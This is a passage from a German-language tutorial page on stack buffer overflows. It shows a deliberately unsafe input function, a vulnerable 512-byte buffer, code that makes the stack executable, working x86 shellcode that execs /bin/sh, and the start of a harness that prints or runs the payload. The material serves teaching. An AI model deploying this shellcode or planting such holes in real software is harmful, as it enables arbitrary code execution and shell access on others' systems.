style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">TRACE_ESP</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">functionname</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">endif</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Aus Demonstrationszwecken wurde die Funktion <code>__gets()</code> programmiert, die sich jedoch in etwa wie <code>gets()</code> verhält. Der qualitative Unterschied ist, dass das Verhalten der Funktion beim Lesen von Binärdaten besser beeinflusst werden kann.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* dangerous: __gets is evil!!! never call this function!!! */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> ptr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">fread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token char">'\n'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">ptr</span><span class="token operator" style="color:#393A34">++</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">ptr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token char">'\0'</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Der Angriff selbst richtet sich gegen die Funktion <code>do_work()</code>. Es wird ausgenutzt, dass <code>__gets()</code> in den Buffer name schreibt, ohne zu prüfen, ob genügend Platz im Buffer ist.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">do_work</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">TRACE_ESP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"do_work"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"What's your name? "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">__gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"hello, %s\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Interessant ist im Hauptprogramm vor dem Aufruf von <code>do_work()</code> die Manipulation der Zugriffsrechte des Stacks. Hier ist es für den Interessierten möglich, zu testen, wie sich das Programm bei eingeschränkten Zugriffsrechten (insbesondere ohne <code>PROT_EXEC</code>) verhält.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">ifdef</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">UNPROTECT_STACK</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mprotect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">STACK_BEGIN</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       STACK_SIZE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> STACK_PERMISSIONS</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">fprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stderr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"mprotect: %s\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strerror</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">errno</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">endif</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">TRACE_ESP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"main"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">do_work</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Der Täter</h1>
<p>Der Shellcode arbeitet in mehreren Schritten:</p>
<ul>
<li>Sprung zum Ende des Shellcodes (<code>call_position</code>) und wieder zurück an den Anfang. Damit liegt die Adresse des ersten Bytes nach dem call auf dem Stack. Diese wird dann in <code>%esi</code> gespeichert.</li>
<li>Anlegen eines neuen Stackframes unterhalb des Shellcodes. Das Problem ist, dass in der Testumgebung (Solaris Brandz mit Linux) ein Aufruf von <code>int $0x80</code> in eine Anwendungsbibliothek (<code>lx_brandz.so.1</code>) weitergeleitet wird. Diese Funktionsaufrufe belegen natürlich Platz auf unserem Stack und überschreiben die Zeichenkette <code>"/bin/sh"</code> und die beiden Pointer <code>argv</code> und <code>env</code>. Durch das Erzeugen des neuen Stackframes werden die Daten vor dem Überschreiben geschützt.</li>
<li><code>stdin</code> schließen und wieder neu starten. Bei der Vorführung wird das Programm den Injection Vector (IV) per Pipe oder Eingabeumleitung lesen. Nach dem vollständigen Lesen des IV und anschließenden Starten von <code>/bin/sh</code> wird <code>read()</code> keine Daten mehr zu lesen haben, was die Shell als <code>EOF</code> interpretiert und sich beendet. Daher schließen wir die Pipe und öffnen <code>/dev/tty</code> als Dateideskriptor 0, was <code>stdin</code> entspricht.</li>
<li>Ausführen von <code>/bin/sh</code>. Eine ausführliche Erklärung dieses Programmfragments findet sich in <a href="http://www.phrack.com/issues.html?issue=49&amp;id=14" target="_blank" rel="noopener noreferrer" title="Smashing The Stack For Fun And Profit">Aleph One: Smashing The Stack For Fun And Profit. Phrack, Volume Seven, Issue Forty-Nine</a>.</li>
</ul>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xeb\x43"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   jmp    0x804840d &lt;call_position&gt; */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x5e"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   pop    %esi */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* create artificial stack begin */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\xf4"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %esi, %esp */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\xf5"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov  %esi, %ebp */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x83\xed\x40"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   sub  $0x40, %ebp */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x83\xec\x60"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   sub  $0x60, %esp */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* close stdin and reopen it */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x56"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   push   %esi */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xc0"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %eax,%eax */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xb0\x06"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    $0x6,%al */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xdb"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %ebx,%ebx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xcd\x80"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   int    $0x80 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x5e"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   pop    %esi */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x56"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   push   %esi */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xc0"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %eax,%eax */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x88\x46\x0f"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %al,0x0f(%esi) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xb0\x05"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    $0x5,%al */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x8d\x5e\x07"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   lea    0x7(%esi),%ebx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xc9"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %ecx,%ecx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xcd\x80"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   int    $0x80 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x5e"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   pop    %esi */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* exec /bin/sh (I copied the whole thing from shellcode.org) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\x76\x08"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %esi,0x8(%esi) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xc0"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %eax,%eax */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x88\x46\x07"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %al,0x7(%esi) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\x46\x0c"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %eax,0xc(%esi) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xb0\x0b"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    $0xb,%al */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\xf3"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %esi,%ebx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x8d\x4e\x08"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   lea    0x8(%esi),%ecx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x8d\x56\x0c"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   lea    0xc(%esi),%edx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xcd\x80"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   int    $0x80 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x31\xdb"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   xor    %ebx,%ebx */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x89\xd8"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   mov    %ebx,%eax */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\x40"</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">/*   inc    %eax */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xcd\x80"</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/*   int    $0x80 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"\xe8\xb8\xff\xff\xff"</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/*   call   start_of_exploit */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"/bin/sh"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"/dev/tty"</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1><code>shellcode.c</code></h1>
<p>Wir nutzen nachfolgendes Programm, um den Shellcode auszugeben bzw. den Injection Vector zu konstruieren. Das Programm versteht die Parameter <code>-l</code> (Ausgeben der Länge des Shellcode) und <code>-x</code> (Ausführen des Shellcodes). Wenn man das Programm ohne Parameter ausführt, wird der Shellcode auf <code>stdout</code> ausgegeben.</p>
<p>Der Shellcode selbst sollte in einer Variable namens <code>shellcode</code> gespeichert sein, die wiederum in einer Headerdatei definiert ist. Diese Headerdatei wird -- ungewöhnlicherweise -- mitten innerhalb von main() eingebunden. Die Ursache dafür ist, dass der Shellcode davon ausgeht, sich innerhalb des Stacks zu befinden. Um den Shellcode zu testen, sollte man also eine möglichst realistische Umgebung schaffen und den Shellcode in einem lokalen Puffer speichern.</p>
<p>Auch hier möchte ich wieder auf die Möglichkeit hinweisen, die Verhaltensweise des Shellcodes bei einem mit <code>mprotect()</code> geschützten Stack auszuprobieren.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;sys/mman.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* include shellcode buffer here, so that it is stored on the stack */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">"own.c"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argc </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span 